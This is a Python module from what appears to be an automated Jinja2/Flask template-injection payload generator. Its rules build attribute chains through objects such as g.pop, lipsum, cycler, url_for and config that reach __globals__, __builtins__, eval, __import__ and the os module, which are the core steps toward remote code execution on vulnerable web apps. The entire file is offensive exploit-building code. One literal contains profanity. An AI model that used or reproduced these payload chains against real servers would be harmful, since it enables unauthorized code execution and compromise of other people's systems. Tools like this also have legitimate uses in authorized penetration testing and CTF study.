import random
import string

# pylint: disable=wildcard-import,unused-wildcard-import,missing-function-docstring,unused-argument

from ..payload_gen import expression_gen, precedence

from ..const import *


# ---


@expression_gen
def gen_builtins_dict_flaskattrs(context):
    funcs_attrs = [
        ("g", "pop"),
        ("g", "get"),
        ("session", "get"),
        ("request", "close"),
    ]
    alternatives = [
        [
            (
                CHAINED_ATTRIBUTE_ITEM,
                (FLASK_CONTEXT_VAR, obj_name),
                (ATTRIBUTE, attr_name),
                (ATTRIBUTE, "__globals__"),
                (ITEM, "__builtins__"),
            )
        ]
        for obj_name, attr_name in funcs_attrs
    ]
    return [(ONEOF, alternatives)]


@expression_gen
def gen_builtins_dict_jinjaattrs(context):
    funcs_attrs = [
        ("cycler", "next"),
        ("cycler", "reset"),
        ("cycler", "__init__"),
        ("joiner", "__init__"),
        ("namespace", "__init__"),
    ]
    alternatives = [
        [
            (
                CHAINED_ATTRIBUTE_ITEM,
                (JINJA_CONTEXT_VAR, obj_name),
                (ATTRIBUTE, attr_name),
                (ATTRIBUTE, "__globals__"),
                (ITEM, "__builtins__"),
            )
        ]
        for obj_name, attr_name in funcs_attrs
    ]
    return [(ONEOF, alternatives)]


@expression_gen
def gen_builtins_dict_lipsum(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "lipsum"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_unexist(context):
    unexist = [
        [(LITERAL, "x")],
        [(LITERAL, "unexistfuckyou")],
    ] + [
        [(LITERAL, "".join(random.choices(string.ascii_lowercase, k=6)))]
        for _ in range(20)
    ]
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["literal"], [(ONEOF, unexist)]),
            (ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_safesplit(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "split"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_safejoin(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "join"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_safelower(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "lower"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


@expression_gen
def gen_builtins_dict_safezfill(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (EXPRESSION, precedence["filter"], [(LITERAL, "()|safe")]),
            (ATTRIBUTE, "zfill"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "__builtins__"),
        )
    ]


# ---


@expression_gen
def gen_import_func_general(context):
    return [(ITEM, (BUILTINS_DICT,), "__import__")]


# ---


@expression_gen
def gen_eval_func_general(context):
    return [(ITEM, (BUILTINS_DICT,), "eval")]


# ---


@expression_gen
def gen_eval_normal(context, eval_param):
    return [(FUNCTION_CALL, (EVAL_FUNC,), [eval_param])]
    # target_list = [
    #     (ENCLOSE_UNDER, precedence["function_call"], (EVAL_FUNC,)),
    #     (LITERAL, "("),
    #     eval_param,
    #     (LITERAL, ")"),
    # ]
    # return [(EXPRESSION, precedence["function_call"], target_list)]


# ---

# 获取flask配置的生成规则


@expression_gen
def gen_config_flask_context_var(context):
    return [(EXPRESSION, precedence["literal"], [(FLASK_CONTEXT_VAR, "config")])]


@expression_gen
def gen_config_self(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (JINJA_CONTEXT_VAR, "self"),
            (ATTRIBUTE, "__dict__"),
            (ITEM, "_TemplateReference__context"),
            (ITEM, "config"),
        )
    ]


# ---


@expression_gen
def gen_module_os_import(context):
    return [(FUNCTION_CALL, (IMPORT_FUNC,), [(STRING, "os")])]


@expression_gen
def gen_module_os_eval(context):
    return [(FUNCTION_CALL, (EVAL, (STRING, "__import__")), [(STRING, "os")])]


# 有500修正了，可以大胆加规则


@expression_gen
def gen_module_os_config(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (CONFIG,),
            (CLASS_ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_gpop(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "pop"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_gget(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "g"),
            (ATTRIBUTE, "get"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]


@expression_gen
def gen_module_os_urlfor(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (FLASK_CONTEXT_VAR, "url_for"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]
